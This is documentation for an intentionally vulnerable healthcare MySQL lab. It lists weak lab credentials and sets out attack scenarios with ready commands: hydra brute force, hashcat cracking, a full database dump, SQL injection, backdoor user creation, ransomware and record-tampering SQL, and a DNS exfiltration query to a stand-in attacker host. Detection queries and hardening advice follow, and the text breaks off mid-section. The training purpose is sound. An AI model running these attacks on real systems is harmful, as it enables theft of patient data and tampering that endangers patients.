# Database Security Documentation

## ⚠️ WARNING: INTENTIONAL VULNERABILITIES

This document describes the **intentionally vulnerable** MySQL database configuration used in the MEDUSA Healthcare Lab environment. This database is designed for **security testing and educational purposes ONLY**.

**DO NOT use these configurations in production environments.**

---

## Table of Contents

1. [Database Overview](#database-overview)
2. [Database Schema](#database-schema)
3. [Database Users and Privileges](#database-users-and-privileges)
4. [Intentional Vulnerabilities](#intentional-vulnerabilities)
5. [Exploitation Scenarios](#exploitation-scenarios)
6. [Attack Surface Analysis](#attack-surface-analysis)
7. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Database Overview

### Connection Information

```
Host: localhost (or ehr-database within Docker network)
Port: 3306 (exposed to host)
Database: healthcare_db
```

### Architecture

```
┌─────────────────────────────────────────────┐
│         MySQL 8.0 Database Server           │
│                                             │
│  ┌────────────────────────────────────┐    │
│  │      healthcare_db                 │    │
│  │                                     │    │
│  │  Tables:                            │    │
│  │  - users (system accounts)         │    │
│  │  - patients (PHI data)             │    │
│  │  - medical_records                 │    │
│  │  - appointments                    │    │
│  │  - prescriptions                   │    │
│  │  - lab_results                     │    │
│  │  - audit_log                       │    │
│  │  - comments (plaintext passwords!) │    │
│  │  - billing                         │    │
│  └────────────────────────────────────┘    │
│                                             │
│  ┌────────────────────────────────────┐    │
│  │      Database Users                 │    │
│  │                                     │    │
│  │  - root (full access)              │    │
│  │  - ehrapp (all privileges)         │    │
│  │  - backup (read + lock)            │    │
│  │  - reporting (read-only)           │    │
│  │  - dev (all privileges)            │    │
│  └────────────────────────────────────┘    │
└─────────────────────────────────────────────┘
```

---

## Database Schema

### Core Tables

#### 1. users
**Purpose:** System authentication and authorization

| Column | Type | Description | Vulnerability |
|--------|------|-------------|---------------|
| id | INT | Primary key | - |
| username | VARCHAR(50) | User login name | Predictable patterns |
| password_hash | VARCHAR(32) | MD5 hash | **WEAK: MD5 is broken** |
| email | VARCHAR(100) | User email | - |
| role | ENUM | User role | No fine-grained permissions |
| created_at | TIMESTAMP | Account creation | - |
| last_login | TIMESTAMP | Last login time | No login attempt tracking |
| is_active | BOOLEAN | Account status | - |
| failed_login_attempts | INT | Failed logins | Not enforced |
| account_locked | BOOLEAN | Lock status | Not enforced |

**Sample Data:**
- Admin user: `admin` / `password` (MD5: `5f4dcc3b5aa765d61d8327deb882cf99`)
- Doctor: `doctor1` / `123456` (MD5: `e10adc3949ba59abbe56e057f20f883e`)

#### 2. patients
**Purpose:** Patient demographic and PHI data

| Column | Type | Description | Vulnerability |
|--------|------|-------------|---------------|
| id | INT | Primary key | - |
| first_name, last_name | VARCHAR(50) | Patient name | No encryption |
| dob | DATE | Date of birth | **Unencrypted PII** |
| ssn | VARCHAR(11) | Social Security # | **CRITICAL: Unencrypted SSN** |
| phone | VARCHAR(15) | Phone number | Unencrypted |
| email | VARCHAR(100) | Email address | Unencrypted |
| address, city, state, zip | TEXT/VARCHAR | Address info | Unencrypted |
| insurance_provider | VARCHAR(100) | Insurance company | - |
| insurance_policy_number | VARCHAR(50) | Policy number | Unencrypted |
| blood_type | VARCHAR(5) | Blood type | - |
| allergies | TEXT | Known allergies | - |
| medical_notes | TEXT | Clinical notes | Unencrypted sensitive data |

**Contains:** 50 synthetic patients with realistic data

#### 3. medical_records
**Purpose:** Clinical documentation

| Column | Type | Description | Vulnerability |
|--------|------|-------------|---------------|
| id | INT | Primary key | - |
| patient_id | INT | Foreign key | IDOR vulnerable |
| record_date | DATE | Date of service | - |
| diagnosis | TEXT | Diagnosis | Unencrypted |
| medications | TEXT | Medication list | Unencrypted |
| doctor_notes | TEXT | Clinical notes | Unencrypted sensitive data |

**Contains:** 200+ medical records with detailed clinical information

#### 4. appointments
**Purpose:** Scheduling information

| Column | Type | Description | Vulnerability |
|--------|------|-------------|---------------|
| id | INT | Primary key | - |
| patient_id | INT | Foreign key | IDOR vulnerable |
| doctor | VARCHAR(100) | Physician name | - |
| date | DATETIME | Appointment datetime | - |
| type | VARCHAR(50) | Visit type | - |
| status | ENUM | Appointment status | - |
| notes | TEXT | Appointment notes | - |

**Contains:** 100+ appointments (scheduled, completed, cancelled, no-show)

#### 5. audit_log
**Purpose:** Security audit trail

| Column | Type | Description | Vulnerability |
|--------|------|-------------|---------------|
| id | INT | Primary key | - |
| user_id | INT | User performing action | Minimal logging |
| action | VARCHAR(100) | Action performed | No data change tracking |
| timestamp | TIMESTAMP | When action occurred | - |
| ip_address | VARCHAR(45) | Source IP | Not validated |
| table_name | VARCHAR(50) | Affected table | Optional |
| record_id | INT | Affected record | Optional |

**Vulnerability:** Insufficient logging, no data retention policy enforced

#### 6. comments ⚠️ **CRITICAL VULNERABILITY**
**Purpose:** User comments and notes

| Column | Type | Description | Vulnerability |
|--------|------|-------------|---------------|
| id | INT | Primary key | - |
| user_id | INT | Comment author | - |
| patient_id | INT | Related patient | Optional |
| comment_text | TEXT | Comment content | - |
| plaintext_credential | VARCHAR(255) | **PASSWORDS IN PLAINTEXT** | **CRITICAL** |

**CRITICAL VULNERABILITY:** Contains plaintext passwords including:
- Database admin credentials: `db_admin_password: MedC@re2024`
- Backup server credentials: `backup_server: ftpadmin / FtpB@ckup123`
- LDAP service accounts: `ldap_service: cn=admin,dc=medcare,dc=local / LdapAdm1n!`
- VPN credentials: `vpn_username: remote_access / Vpn@ccess2024`
- Application root: `ehr_app_root: ehrroot / Ehr@pp2024!`

---

## Database Users and Privileges

### User Inventory

#### 1. root (MySQL Root Account)

```sql
Username: root
Password: admin123
Host: % (any host)
Privileges: ALL PRIVILEGES WITH GRANT OPTION
```

**Vulnerabilities:**
- ⚠️ Remote root access enabled (should be localhost only)
- ⚠️ Weak, guessable password
- ⚠️ No password complexity requirements
- ⚠️ Common default password pattern

**Testing Connection:**
```bash
mysql -h localhost -P 3306 -u root -padmin123
```

**Attack Scenario:** Brute force attack likely to succeed

---

#### 2. ehrapp (Application User)

```sql
Username: ehrapp
Password: Welcome123!
Host: % (any host)
Privileges: ALL PRIVILEGES ON healthcare_db.*
```

**Vulnerabilities:**
- ⚠️ Overly permissive privileges (should use principle of least privilege)
- ⚠️ Can DROP tables, CREATE users, GRANT privileges
- ⚠️ Can modify schema
- ⚠️ Weak password following common pattern
- ⚠️ Same credentials used across all environments

**Required Privileges (Should be):**
```sql
-- Application should only need:
GRANT SELECT, INSERT, UPDATE ON healthcare_db.* TO 'ehrapp'@'host';
-- NOT:
GRANT ALL PRIVILEGES ON healthcare_db.* TO 'ehrapp'@'%';
```

**Exploitation:**
```sql
-- Attacker who compromises ehrapp can:
DROP TABLE patients;                    -- Delete all patient data
CREATE USER 'backdoor'@'%' ...;        -- Create backdoor accounts
GRANT ALL PRIVILEGES ...;               -- Escalate privileges
SELECT * FROM mysql.user;              -- Dump password hashes
```

---

#### 3. backup (Backup User)

```sql
Username: backup
Password: backup123
Host: % (any host)
Privileges: SELECT, LOCK TABLES ON healthcare_db.*
```

**Vulnerabilities:**
- ⚠️ Extremely weak password (matches username pattern)
- ⚠️ Can read all data including SSN, PHI
- ⚠️ Remote access enabled

**Exploitation:**
```bash
# Dump entire database
mysqldump -h localhost -P 3306 -u backup -pbackup123 healthcare_db > stolen_data.sql
```

---

#### 4. reporting (Reporting User)

```sql
Username: reporting
Password: reports
Host: % (any host)
Privileges: SELECT ON healthcare_db.*
```

**Vulnerabilities:**
- ⚠️ Trivially weak password
- ⚠️ Read access to all PHI data
- ⚠️ No query auditing
- ⚠️ No rate limiting

**Exploitation:**
```sql
-- Extract all SSNs
SELECT first_name, last_name, ssn, dob FROM patients;

-- Export PHI
SELECT * FROM medical_records INTO OUTFILE '/tmp/phi_breach.csv';
```

---

#### 5. dev (Development User)

```sql
Username: dev
Password: dev
Host: % (any host)
Privileges: ALL PRIVILEGES ON healthcare_db.*
```

**Vulnerabilities:**
- ⚠️ **CRITICAL:** Development account in production
- ⚠️ Extremely weak password (single word)
- ⚠️ Full database privileges
- ⚠️ Should have been removed after UAT

**This account should NOT exist in production!**

---

### Privilege Escalation Paths

```
┌─────────────────────────────────────────────────────────┐
│  Attack Path: Database Privilege Escalation            │
└─────────────────────────────────────────────────────────┘

1. Initial Access:
   ├─ Compromise application (SQL injection, file upload)
   ├─ Credential stuffing with common passwords
   ├─ Plaintext credentials from comments table
   └─ Exposed environment variables

2. Lateral Movement:
   ├─ Read config files (database credentials)
   ├─ Query comments table for plaintext passwords
   ├─ Dump audit_log for IP addresses and patterns
   └─ Extract password hashes from users table

3. Privilege Escalation:
   ├─ Use ehrapp credentials (ALL PRIVILEGES)
   ├─ Create new admin users
   ├─ Modify existing user privileges
   └─ Access MySQL system tables

4. Data Exfiltration:
   ├─ Dump patients table (50 SSNs)
   ├─ Extract medical_records (200+ records)
   ├─ Export prescriptions and lab results
   └─ Copy billing information (credit cards)

5. Persistence:
   ├─ Create backdoor MySQL users
   ├─ Modify stored procedures
   ├─ Install triggers for data capture
   └─ Establish reverse shell via MySQL
```

---

## Intentional Vulnerabilities

### 1. Cryptographic Weaknesses

#### MD5 Password Hashing
**Location:** `users` table, `password_hash` column

**Vulnerability:** MD5 is cryptographically broken and unsuitable for passwords.

**Issues:**
- Fast hashing allows rapid brute force (billions of hashes/second)
- No salt used (vulnerable to rainbow tables)
- Collision attacks possible
- MD5 hashes trivially crackable

**Example:**
```sql
-- Stored password hash for 'admin'
SELECT username, password_hash FROM users WHERE username='admin';
-- Returns: 5f4dcc3b5aa765d61d8327deb882cf99

-- Crack with:
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --format=Raw-MD5 hash.txt
# Cracks instantly: "password"
```

**Attack:**
```bash
# Extract all password hashes
mysql -u reporting -preports -h localhost healthcare_db \
  -e "SELECT username, password_hash, role FROM users" > hashes.txt

# Crack with hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Most passwords crack within seconds
```

**Proper Implementation:**
```php
// NEVER DO THIS:
$hash = md5($password);

// DO THIS INSTEAD:
$hash = password_hash($password, PASSWORD_ARGON2ID);
```

---

#### Plaintext Passwords in Comments Table
**Location:** `comments` table, `plaintext_credential` column

**Vulnerability:** Administrative credentials stored in plaintext

**Exposed Credentials:**
```sql
SELECT comment_text, plaintext_credential 
FROM comments 
WHERE plaintext_credential IS NOT NULL;
```

**Results:**
- `db_admin_password: MedC@re2024`
- `backup_server: ftpadmin / FtpB@ckup123`
- `ldap_service: cn=admin,dc=medcare,dc=local / LdapAdm1n!`
- `patient_portal_pwd: DoeJ2024!`
- `temp_portal_pwd: Welcome2024`
- `dev_db_user: devuser / DevPass123!`
- `reporting_user: reports / Rep0rt$2024`
- `vpn_username: remote_access / Vpn@ccess2024`
- `ehr_app_root: ehrroot / Ehr@pp2024!`

**Impact:** Complete system compromise

---

### 2. Access Control Failures

#### Overly Permissive Database Users

**Problem:** Application user `ehrapp` has ALL PRIVILEGES

```sql
SHOW GRANTS FOR 'ehrapp'@'%';
-- Result: GRANT ALL PRIVILEGES ON `healthcare_db`.* TO `ehrapp`@`%`
```

**What this allows:**
- DROP DATABASE
- CREATE USER
- GRANT privileges
- ALTER tables
- TRUNCATE tables
- Load/export files (if file_priv granted)

**Proper Least Privilege:**
```sql
-- Application should only get:
GRANT SELECT, INSERT, UPDATE, DELETE ON healthcare_db.patients TO 'ehrapp'@'host';
GRANT SELECT, INSERT ON healthcare_db.audit_log TO 'ehrapp'@'host';
-- etc. for each table, only permissions needed
```

---

#### Remote Root Access

**Problem:** Root user can connect from any host (`%`)

```sql
SELECT user, host FROM mysql.user WHERE user='root';
-- Returns: root, %
```

**Should be:**
```sql
-- Root should only be localhost
CREATE USER 'root'@'localhost' IDENTIFIED BY 'strong_password';
-- NOT:
CREATE USER 'root'@'%' ...
```

---

### 3. Insufficient Data Protection

#### Unencrypted PII/PHI

**Tables with unencrypted sensitive data:**

| Table | Sensitive Columns | HIPAA Requirement |
|-------|-------------------|-------------------|
| patients | ssn, dob, phone, email, address | Encryption required |
| medical_records | diagnosis, medications, doctor_notes | Encryption required |
| prescriptions | medication_name, dosage | Encryption required |
| lab_results | test_name, result_value | Encryption required |
| billing | credit_card_last4 | PCI-DSS violation |

**Impact:**
- Any user with SELECT privilege can read SSNs
- Data breaches expose complete PHI
- HIPAA violations
- PCI-DSS violations

**Exploitation:**
```sql
-- Steal all SSNs (identity theft)
SELECT first_name, last_name, ssn, dob, address 
FROM patients 
ORDER BY last_name;

-- Extract sensitive medical information
SELECT p.first_name, p.last_name, m.diagnosis, m.medications
FROM patients p
JOIN medical_records m ON p.id = m.patient_id
WHERE m.diagnosis LIKE '%HIV%' OR m.diagnosis LIKE '%psychiatric%';
```

---

#### No Column-Level Encryption

MySQL supports encryption, but it's not implemented:

```sql
-- Should be using:
CREATE TABLE patients (
    ssn VARBINARY(255),  -- Encrypted
    dob_encrypted VARBINARY(255),  -- Encrypted
    -- etc.
);

-- With encryption functions:
INSERT INTO patients (ssn) VALUES (AES_ENCRYPT('123-45-6789', @key));
SELECT AES_DECRYPT(ssn, @key) FROM patients;
```

---

### 4. Audit and Logging Deficiencies

#### Minimal Audit Logging

**Current audit_log table issues:**
- No trigger-based automatic logging
- Application must manually log (easily bypassed)
- No data change tracking (before/after values)
- No schema change logging
- Limited retention policy

**What's NOT logged:**
- Direct MySQL connections (bypassing app)
- Failed authentication attempts (except manual logs)
- Privilege changes
- Data modifications (UPDATE/DELETE without app)
- Bulk exports

**Attack:**
```sql
-- Attacker connects directly to MySQL, bypassing audit logs
mysql -u ehrapp -pWelcome123! -h ehr-database healthcare_db

-- These actions are NOT audited:
UPDATE patients SET ssn='000-00-0000' WHERE id=1;  -- No log
DELETE FROM medical_records WHERE patient_id=5;    -- No log
SELECT * FROM patients INTO OUTFILE '/tmp/dump.csv'; -- No log
```

---

### 5. Network Security

#### Exposed Database Port

**Problem:** MySQL port 3306 exposed to host machine

```yaml
# docker-compose.yml
ports:
  - "3306:3306"    # EXPOSED
```

**Allows:**
- Direct connection from outside container
- Bypassing application layer security
- Brute force attacks from any network location
- No application-level rate limiting

**Attack:**
```bash
# From attacker machine:
nmap -p 3306 target-host
# Port 3306 open

# Brute force:
hydra -L users.txt -P passwords.txt mysql://target-host
```

**Should be:**
```yaml
# Only expose to internal Docker network
# NO ports section, or:
ports:
  - "127.0.0.1:3306:3306"  # Localhost only
```

---

## Exploitation Scenarios

### Scenario 1: Credential Stuffing → Full Database Access

**Attack Steps:**

1. **Reconnaissance:**
```bash
nmap -sV -p 3306 target-host
# Identifies MySQL 8.0
```

2. **Credential Guessing:**
```bash
# Try common credentials
mysql -h target-host -u root -padmin
mysql -h target-host -u root -padmin123  # SUCCESS!
```

3. **Database Enumeration:**
```sql
SHOW DATABASES;
USE healthcare_db;
SHOW TABLES;
DESCRIBE patients;
```

4. **Data Exfiltration:**
```sql
-- Dump all SSNs
SELECT first_name, last_name, ssn, dob 
FROM patients 
INTO OUTFILE '/tmp/stolen_ssn.csv';

-- Export medical records
SELECT * FROM medical_records 
INTO OUTFILE '/tmp/phi_breach.csv';
```

5. **Find Additional Credentials:**
```sql
-- Check comments for plaintext passwords
SELECT * FROM comments WHERE plaintext_credential IS NOT NULL;
-- Reveals: backup server, LDAP, VPN credentials!
```

**Impact:**
- 50 SSNs stolen (identity theft)
- 200+ medical records exposed (HIPAA breach)
- Lateral movement credentials obtained
- Estimated breach cost: $429 per record × 50 = $21,450+

---

### Scenario 2: SQL Injection → Privilege Escalation

**Attack Steps:**

1. **SQL Injection in Application:**
```sql
-- Vulnerable query in application:
"SELECT * FROM patients WHERE id = " + user_input

-- Inject:
1' UNION SELECT username, password_hash, NULL, NULL, NULL 
FROM users WHERE role='admin'--
```

2. **Extract Password Hashes:**
```
Results:
admin | 5f4dcc3b5aa765d61d8327deb882cf99 | ...
```

3. **Crack MD5 Hash:**
```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 3
# Cracks to: "password"
```

4. **Login as Admin:**
```bash
mysql -h target-host -u root -padmin123
```

5. **Create Backdoor:**
```sql
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'secret_pass';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

---

### Scenario 3: Backup User → Data Exfiltration

**Attack Steps:**

1. **Discover Backup User:**
```sql
-- From compromised application or comments table:
Username: backup
Password: backup123
```

2. **Connect with Backup User:**
```bash
mysql -h target-host -u backup -pbackup123 healthcare_db
```

3. **Verify Privileges:**
```sql
SHOW GRANTS;
-- Result: SELECT, LOCK TABLES on healthcare_db.*
```

4. **Dump Entire Database:**
```bash
mysqldump -h target-host -u backup -pbackup123 \
  --single-transaction \
  --quick \
  --lock-tables=false \
  healthcare_db > complete_breach.sql

# File contains:
# - 50 patients with SSNs
# - 200+ medical records
# - All prescriptions
# - Billing information
# - User password hashes
```

5. **Extract Specific High-Value Data:**
```bash
# Create script to extract SSNs only:
mysql -h target-host -u backup -pbackup123 -N -B healthcare_db <<EOF
SELECT CONCAT(first_name, ',', last_name, ',', ssn, ',', dob)
FROM patients;
EOF > ssn_list.csv
```

**Impact:**
- Complete PHI breach
- Regulatory fines (HIPAA: up to $1.5M per violation category)
- Reputation damage
- Class action lawsuits

---

### Scenario 4: Comments Table → Lateral Movement

**Attack Steps:**

1. **Initial Access** (any low-priv user):
```sql
-- Even the 'reporting' user can read comments:
mysql -h target-host -u reporting -preports healthcare_db
```

2. **Query Comments Table:**
```sql
SELECT id, comment_text, plaintext_credential 
FROM comments 
WHERE plaintext_credential IS NOT NULL;
```

3. **Harvest Credentials:**
```
Results:
- db_admin_password: MedC@re2024
- backup_server: ftpadmin / FtpB@ckup123
- ldap_service: cn=admin,dc=medcare,dc=local / LdapAdm1n!
- vpn_username: remote_access / Vpn@ccess2024
- ehr_app_root: ehrroot / Ehr@pp2024!
```

4. **Lateral Movement:**

**Access FTP Server:**
```bash
ftp target-host
Username: ftpadmin
Password: FtpB@ckup123
# Access to medical records backups
```

**Access LDAP:**
```bash
ldapsearch -x -H ldap://target-host:389 \
  -D "cn=admin,dc=medcare,dc=local" \
  -w "LdapAdm1n!" \
  -b "dc=medcare,dc=local"
# Extract all user accounts
```

**Access VPN:**
```
VPN Client: remote_access / Vpn@ccess2024
# Internal network access
```

**Access Application Server:**
```bash
ssh ehrroot@ehr-webapp-server
Password: Ehr@pp2024!
# Root access to application server
```

**Impact:**
- Complete infrastructure compromise
- Pivot to all systems
- Persistent access established
- Supply chain attack potential

---

## Attack Surface Analysis

### External Attack Surface

```
┌────────────────────────────────────────────┐
│     External Network (Internet/WAN)       │
└───────────────┬────────────────────────────┘
                │
                ├─> Port 3306 (MySQL) ─────┐ EXPOSED
                ├─> Port 8080 (Web App)────┤
                ├─> Port 3000 (API)────────┤
                ├─> Port 2222 (SSH)────────┤
                ├─> Port 21 (FTP)──────────┤
                └─> Port 389 (LDAP)────────┘
                         │
                         ▼
            ┌─────────────────────────┐
            │   Healthcare Internal   │
            │       Network           │
            │                         │
            │  ┌──────────────────┐   │
            │  │  MySQL Database  │   │
            │  │   (vulnerable)   │   │
            │  └──────────────────┘   │
            └─────────────────────────┘
```

**Risk Assessment:**

| Port | Service | Risk Level | Reasoning |
|------|---------|------------|-----------|
| 3306 | MySQL | **CRITICAL** | Direct database access, weak credentials |
| 8080 | Web App | **HIGH** | SQL injection, XSS, IDOR |
| 3000 | API | **HIGH** | Weak JWT, missing authentication |
| 2222 | SSH | **HIGH** | Weak passwords, brute force |
| 21 | FTP | **HIGH** | Anonymous access, plaintext |
| 389 | LDAP | **MEDIUM** | Anonymous bind, unencrypted |

---

### Internal Attack Surface

**From Compromised Container:**

1. **Database Access:**
   - All containers can access `ehr-database:3306`
   - No network segmentation
   - No firewall rules between containers

2. **Service-to-Service:**
   - Web app connects with `ehrapp` (ALL PRIVILEGES)
   - API connects with same credentials
   - No service account isolation

3. **Volume Mounts:**
   - Database files in volume (accessible if container compromised)
   - Log files contain queries (may expose credentials)
   - Backup scripts in shared volumes

---

### Data Flow Vulnerabilities

```
User Request
     │
     ▼
┌─────────────┐
│  Web/API    │  Credentials: ehrapp / Welcome123!
│  Container  │  Privileges: ALL
└──────┬──────┘
       │ Unencrypted connection
       │ No TLS/SSL
       ▼
┌─────────────┐
│   MySQL     │  Port 3306 exposed
│  Container  │  Root: admin123
└─────────────┘  Backup: backup123
       │          Dev: dev
       │          Reporting: reports
       ▼
┌─────────────┐
│ Persistent  │  Unencrypted volume
│   Volume    │  No encryption at rest
└─────────────┘
```

---

## MITRE ATT&CK Mapping

### Techniques Demonstrated

#### Initial Access

**T1078: Valid Accounts**
- **Sub-technique:** T1078.001 - Default Accounts
- **Description:** Attackers can use default/weak credentials
- **Examples in Lab:**
  - `root / admin123`
  - `ehrapp / Welcome123!`
  - `backup / backup123`
  - `dev / dev`
  - `reporting / reports`

**Detection:**
```sql
-- Monitor for:
SELECT * FROM audit_log 
WHERE action='LOGIN' 
AND ip_address NOT IN (known_good_ips);

-- Check for off-hours access:
SELECT * FROM audit_log 
WHERE action='LOGIN' 
AND HOUR(timestamp) NOT BETWEEN 6 AND 22;
```

---

**T1190: Exploit Public-Facing Application**
- **Description:** SQL injection in web application
- **Example:**
```sql
-- Vulnerable query:
SELECT * FROM patients WHERE id = $_GET['id'];

-- Exploit:
?id=1' UNION SELECT username, password_hash FROM users--
```

---

#### Credential Access

**T1552.001: Unsecured Credentials - Files**
- **Description:** Credentials stored in plaintext in database
- **Location:** `comments` table
- **Impact:** Lateral movement to FTP, LDAP, VPN, SSH

**Exploitation:**
```sql
SELECT comment_text, plaintext_credential 
FROM comments 
WHERE plaintext_credential IS NOT NULL;
```

---

**T1552.004: Unsecured Credentials - Private Keys**
- **Description:** Credentials in environment variables
- **Location:** `.env` file, docker-compose.yml
- **Accessed via:** Container breakout, file read vulnerability

---

**T1110.001: Brute Force - Password Guessing**
- **Description:** Weak passwords vulnerable to dictionary attacks
- **Examples:**
  - `password`, `admin123`, `Welcome123!`
  - Pattern: `[Service]123!` or `[Service]2024`

**Attack:**
```bash
# Wordlist of common patterns
cat > passwords.txt <<EOF
admin
admin123
admin2024
password
password123
Welcome123
Welcome123!
backup
backup123
EOF

# Brute force
hydra -l root -P passwords.txt mysql://target-host
```

---

**T1110.002: Brute Force - Password Cracking**
- **Description:** MD5 hashes easily cracked
- **Method:**
```bash
# Extract hashes
mysql -u reporting -preports -e "SELECT password_hash FROM users" > hashes.txt

# Crack with hashcat
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Or John the Ripper
john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt
```

**Speed:** Modern GPU cracks MD5 at ~60 billion hashes/second

---

#### Privilege Escalation

**T1078.003: Valid Accounts - Local Accounts**
- **Description:** Escalate from low-priv to admin
- **Path:**
  1. Compromise `reporting` (read-only)
  2. Read `comments` table
  3. Find plaintext `db_admin_password`
  4. Authenticate as admin

---

**T1068: Exploitation for Privilege Escalation**
- **Description:** Abuse overly permissive database user
- **Example:**
```sql
-- ehrapp has ALL PRIVILEGES
-- Can create admin accounts:
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'complex_pass';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
```

---

#### Collection

**T1213: Data from Information Repositories**
- **Description:** Extract PHI from database
- **Impact:** HIPAA breach, identity theft

**Extraction:**
```sql
-- Collect all PHI
SELECT p.first_name, p.last_name, p.ssn, p.dob,
       m.diagnosis, m.medications, m.doctor_notes
FROM patients p
LEFT JOIN medical_records m ON p.id = m.patient_id
INTO OUTFILE '/tmp/phi_breach.csv';
```

**Data Categories:**
- 50 SSNs (Social Security Numbers)
- 50 dates of birth
- 200+ medical diagnoses
- 200+ medication lists
- Insurance policy numbers
- Billing information
- Credit card partial numbers

---

**T1005: Data from Local System**
- **Description:** Access database files directly
- **Method:** If container is compromised:
```bash
# MySQL data files
cd /var/lib/mysql/healthcare_db
# Contains .ibd files (table data)

# Copy files
tar czf /tmp/db_backup.tar.gz /var/lib/mysql/healthcare_db
# Exfiltrate
```

---

#### Exfiltration

**T1048: Exfiltration Over Alternative Protocol**
- **Description:** Use SQL to exfiltrate data
- **Methods:**
  - `INTO OUTFILE` - Write to filesystem
  - `mysqldump` - Full database dump
  - `SELECT ... INTO DUMPFILE` - Binary data
  - DNS exfiltration via UDF

**Example - DNS Exfiltration:**
```sql
-- If MySQL has DNS resolution:
SELECT CONCAT(ssn, '.exfil.attacker.com') FROM patients;
-- Sends SSNs via DNS queries (stealth exfil)
```

---

**T1567: Exfiltration Over Web Service**
- **Description:** Use application to exfiltrate data
- **Method:**
```python
# Script to extract all data via web API
import requests
for patient_id in range(1, 51):
    response = requests.get(f'http://target/api/patient/{patient_id}')
    # Save PHI
```

---

#### Impact

**T1485: Data Destruction**
- **Description:** Attacker with ALL PRIVILEGES can destroy data
- **Examples:**
```sql
-- Delete all patient data
DROP TABLE patients CASCADE;

-- Corrupt medical records
UPDATE medical_records SET diagnosis='DELETED', doctor_notes='DELETED';

-- Ransomware scenario:
RENAME TABLE patients TO patients_encrypted;
RENAME TABLE medical_records TO medical_records_encrypted;
-- Demand ransom for restoration
```

---

**T1486: Data Encrypted for Impact (Ransomware)**
- **Description:** Encrypt database for ransom
- **Method:**
```sql
-- Backup current data (attacker keeps copy)
CREATE TABLE patients_backup AS SELECT * FROM patients;

-- "Encrypt" by moving to attacker-controlled table
RENAME TABLE patients TO patients_ransomed;
CREATE TABLE patients (id INT PRIMARY KEY, note TEXT);
INSERT INTO patients VALUES (1, 'Your data is encrypted. Pay 10 BTC to recover.');
```

---

**T1491: Defacement**
- **Description:** Modify patient records
- **Impact:** Patient safety, loss of trust
```sql
-- Change medications (patient safety risk)
UPDATE prescriptions 
SET medication_name='TAMPERED', dosage='UNSAFE'
WHERE patient_id=1;

-- Modify allergies (life-threatening)
UPDATE patients 
SET allergies='NO KNOWN ALLERGIES' 
WHERE allergies IS NOT NULL;
```

---

### Attack Kill Chain Mapping

```
┌────────────────────────────────────────────────────────────┐
│               MITRE ATT&CK Kill Chain                      │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  1. Reconnaissance                                         │
│     └─> Port scan (3306 open)                            │
│     └─> Service enumeration (MySQL 8.0)                  │
│                                                            │
│  2. Resource Development                                   │
│     └─> Prepare password wordlist                        │
│     └─> Setup hashcat/john                               │
│                                                            │
│  3. Initial Access [T1078, T1190]                         │
│     ├─> Credential stuffing (admin123)                   │
│     ├─> SQL injection (web app)                          │
│     └─> Weak password (backup/backup123)                 │
│                                                            │
│  4. Execution                                             │
│     └─> SQL queries                                       │
│     └─> Stored procedures (if enabled)                   │
│                                                            │
│  5. Persistence [T1078]                                   │
│     └─> Create backdoor MySQL user                       │
│     └─> Add SSH keys (via comments)                      │
│                                                            │
│  6. Privilege Escalation [T1068, T1078.003]              │
│     ├─> Read comments table                              │
│     ├─> Find plaintext db_admin_password                 │
│     └─> Escalate to root                                 │
│                                                            │
│  7. Defense Evasion                                       │
│     ├─> Clear audit_log entries                          │
│     └─> Use legitimate user accounts                     │
│                                                            │
│  8. Credential Access [T1552.001, T1110.002]             │
│     ├─> Dump password hashes (MD5)                       │
│     ├─> Crack with hashcat                               │
│     ├─> Read plaintext credentials (comments)            │
│     └─> Extract from environment variables               │
│                                                            │
│  9. Discovery                                             │
│     ├─> Enumerate databases (SHOW DATABASES)             │
│     ├─> List tables (SHOW TABLES)                        │
│     ├─> Describe schema (DESCRIBE table)                 │
│     └─> Check privileges (SHOW GRANTS)                   │
│                                                            │
│  10. Lateral Movement [T1078]                             │
│      ├─> Use harvested FTP credentials                   │
│      ├─> Access LDAP with admin password                 │
│      ├─> VPN access (from comments)                      │
│      └─> SSH to application server                       │
│                                                            │
│  11. Collection [T1213, T1005]                            │
│      ├─> SELECT all PHI data                             │
│      ├─> Dump medical records                            │
│      ├─> Extract 50 SSNs                                 │
│      └─> Copy database files                             │
│                                                            │
│  12. Exfiltration [T1048, T1567]                          │
│      ├─> mysqldump to external server                    │
│      ├─> INTO OUTFILE → scp/ftp out                      │
│      ├─> DNS exfiltration                                │
│      └─> HTTP POST via API                               │
│                                                            │
│  13. Impact [T1485, T1486, T1491]                         │
│      ├─> Data destruction (DROP TABLE)                   │
│      ├─> Ransomware (encrypt data)                       │
│      └─> Defacement (modify patient records)             │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

---

## Defensive Measures (For Testing)

### Detection Opportunities

**1. Failed Authentication Attempts:**
```sql
-- Monitor MySQL error log for:
-- [Warning] Access denied for user 'root'@'<IP>'

-- Application-level monitoring:
SELECT COUNT(*) as failed_attempts, user_id, ip_address
FROM audit_log 
WHERE action='FAILED_LOGIN' 
  AND timestamp > NOW() - INTERVAL 1 HOUR
GROUP BY user_id, ip_address
HAVING failed_attempts > 5;
```

---

**2. Unusual Query Patterns:**
```sql
-- Large data exports:
-- Look for: SELECT ... INTO OUTFILE
-- Look for: Queries returning >1000 rows
-- Look for: Full table scans outside business hours

-- In application logs or MySQL query log:
grep "INTO OUTFILE" /var/log/mysql/query.log
grep "SELECT \* FROM patients" /var/log/mysql/query.log
```

---

**3. Privilege Escalation:**
```sql
-- Monitor for new user creation:
SELECT argument FROM mysql.general_log 
WHERE argument LIKE '%CREATE USER%' 
  OR argument LIKE '%GRANT%';

-- Alert on:
-- - New users created
-- - Privilege grants
-- - GRANT OPTION used
```

---

**4. Off-Hours Access:**
```sql
SELECT user_id, username, action, timestamp, ip_address
FROM audit_log
WHERE HOUR(timestamp) BETWEEN 0 AND 5  -- Midnight to 5 AM
   OR DAYOFWEEK(timestamp) IN (1, 7);   -- Weekend
```

---

**5. Geographic Anomalies:**
```sql
